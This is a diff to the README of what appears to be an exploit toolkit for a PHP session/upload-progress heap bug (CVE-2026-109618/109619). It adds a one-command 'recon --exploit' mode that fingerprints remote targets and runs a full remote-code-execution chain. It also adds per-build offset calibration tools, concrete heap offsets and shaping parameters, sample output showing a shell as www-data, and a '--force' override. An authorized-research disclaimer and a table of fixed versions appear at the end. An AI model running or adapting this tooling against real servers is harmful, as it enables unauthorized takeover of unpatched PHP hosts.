@@ -69,9 +69,83 @@ printf 'id; uname -a > /out/p1\n' > out/c
 python3 exploit.py --port 18110 --cmd 'sh</out/c'
 ```
 
-`--retries` defaults to 3. If the most common pointer in an OOB window is
-not `zval_ptr_dtor`, the script rejects that leak via the plausible
-`libphp-main` delta check and reruns the whole chain.
+## Safe pre-flight and one-command exploitation
+(`recon` subcommand)
+
+The `recon` subcommand first probes passively plus
+one ordinary small POST (with `Content-Length`,
+~100B, far below `post_max_size`) to check the gate
+A1 needs (`session.upload_progress.enabled`) and
+whether the version/build matches -- **no chunked
+traffic, no heap shaping, no OOM**. With
+`--exploit`, a detected version that has an
+RCE-verified profile runs the whole chain with
+that profile's offsets and stage params -- one
+command:
+
+```bash
+# local target
+python3 exploit.py recon --port 18110
+# remote target: IP, hostname, or full URL
+# (scheme/path stripped)
+python3 exploit.py recon --host 192.0.2.10 --port 80
+python3 exploit.py recon --host https://example.com --port 80
+
+# container introspection (ini / MPM / SAPI need
+# docker exec)
+python3 exploit.py recon --port 18110 --container p2s-pure-18110
+
+# one-command exploitation:
+# detect version -> select profile -> A1 -> B1 -> A2 -> B2
+python3 exploit.py recon --host https://TARGET --port 443 --exploit
+#   PHP 8.4.26: profile php-8.4.26-trixie-amd64 -
+#                 RCE-verified calibration
+#   exploit: using profile php-8.4.26-trixie-amd64
+#   [try 1] A1: ...
+#   [4/4] RCE OK; proof .../out/p1: uid=33(www-data) ...
+
+# custom command
+python3 exploit.py recon --host TARGET --exploit \
+    --cmd 'sh</out/c'
+```
+
+`--exploit` safety boundary: only `rce_verified=true`
+profiles (currently just 8.4.26) run; other
+versions (symbols calibrated but heap layout not)
+are refused with a clear reason. `--force`
+overrides the refusal (loud WARNING, then runs
+with 8.4.26 placeholder S/hsv and stage params --
+expected to fail or crash the worker). `--retries`
+defaults to 3. If the most common pointer in an
+OOB window is not `zval_ptr_dtor`, the plausible
+`libphp-main` delta check rejects that leak and
+reruns the whole chain.
+
+### Calibrating another version (`tools/calibrate.py`)
+
+Symbol offsets (`zif_system`, `zval_ptr_dtor`) are
+scraped offline per build; the heap-layout fields
+(`S`, `hsv`, stage params) need a lab container of
+the exact build. `tools/calibrate.py` runs the chain
+in a local **podman** (or docker) container, sweeps
+`S`/`hsv`, and writes a `rce_verified=true` profile
+on success:
+
+```bash
+python3 tools/calibrate.py --tag 8.4.26-apache
+# -> profiles/php-8.4.26-...json (rce_verified=true)
+```
+
+**Prerequisite: the build's A1 OOM must be
+contained.** PHP 8.5.x changed the OOM path --
+the heap corrupts (`zend_mm_heap corrupted`) and
+the worker aborts (signal 6) before B1's stale-id
+read, so the A1->B1 chain cannot reach a leak on
+8.5.x with the current primitive. Calibration on
+8.5.x therefore fails (cleanly, with the reason);
+it needs a sub-OOM heap-shaping variant first.
+PHP 8.4.26 (and earlier 8.4) is the verified
+target.
 
 ## The pure-HTTP chain
 
@@ -109,10 +183,75 @@ Offsets (this build, ASLR-independent):
 | fake array `S` | `main+0xF8398` |
 | A2 `hsv` | `main+0x7D720` |
 
-Target environment: Debian 13 (trixie), Apache 2.4.69 prefork, PHP 8.4.26
-NTS mod_php, files session handler. A different PHP build/version needs
-fresh offsets; ASLR changes per container start, and the two leaks in the
-chain derive it at runtime.
+Target environment: Debian 13 (trixie), Apache 2.4.69
+prefork, PHP 8.4.26 NTS mod_php, files session handler.
+ASLR changes per container start; the chain's two leaks
+derive it at runtime. A different PHP build/version
+needs calibration -- see the next section.
+
+## Multi-version calibration (profiles/ directory)
+
+Offsets are **per-build** (e.g. `zif_system` is
+`libphp+0x465370` on 8.4.26 but `libphp+0x5996e0`
+on 8.5.11), so each chain needs a profile:
+
+```bash
+# 1) Offline calibration: pull libphp.so straight
+#    from the Docker Registry and parse its ELF
+#    symtab (~20s/version, no docker daemon needed)
+python3 tools/registry_scrape.py --tag 8.5.11-apache --write
+#    -> profiles/php-8.5.11-trixie-amd64.json
+#       (rce_verified=false: symbol offsets only;
+#        S/hsv/stage params are still 8.4.26
+#        placeholders)
+
+# 2) Full calibration when you have a container
+#    (also writes the profile):
+python3 docker/offsets.py p2s-pure-18110
+#    -> out/offsets.env + profiles/php-<ver>-calibrated-amd64.json
+
+# 3) recon auto-selects a profile by detected
+#    PHP version
+python3 exploit.py recon --host TARGET --port 80
+#    PHP 8.5.11: profile php-8.5.11-trixie-amd64 -
+#                  catalog row, NOT RCE-verified yet
+```
+
+`profiles/php-8.4.26-trixie-amd64.json` is the
+only `rce_verified=true` row (the 5/5 + 15/15 runs
+above). The other rows (8.1.34 / 8.2.34 / 8.3.35 /
+8.4.25 / 8.5.11) are symbol-calibrated only:
+`zif_system` / `zval_ptr_dtor` come from the
+official image's ELF, but `S=main+0xF8398`,
+`hsv=main+0x7D720` and the A1/A2/B1/B2
+heap-shaping parameters (`--big 78`, `--parts 880
+--depth 64 --fillers 115`, `--vl 384 --n1 500
+--n2 495`, `LEAK_SPEC`) depend on that build's heap
+layout and **must be re-calibrated in a real
+container before exploitation** (method in
+pure/RESEARCH_PURE_128M.md §3/§6).
+
+## Vulnerability context (CVE-2026-109618 / CVE-2026-109619)
+
+The primitive class implemented here matches
+**PHP2Shell** (CVE-2026-109618 / CVE-2026-109619,
+CVSS 9.2), disclosed 2026-10-21: session /
+upload-progress state left dangling on PHP's own OOM
+`longjmp()` path -> heap OOB read -> forged
+`pDestructor` RCE. Fixed versions:
+
+| Branch | First fixed |
+|---|---|
+| 8.2 | 8.2.35 |
+| 8.3 | 8.3.36 |
+| 8.4 | 8.4.27 |
+| 8.5 | 8.5.12 |
+
+This repo's target (8.4.26) is the last affected 8.4
+release. For authorized vulnerability research and
+reproduction only; if you find an unpatched target,
+report it to the owner and upgrade to the versions
+above.
 
 ## Evidence
 
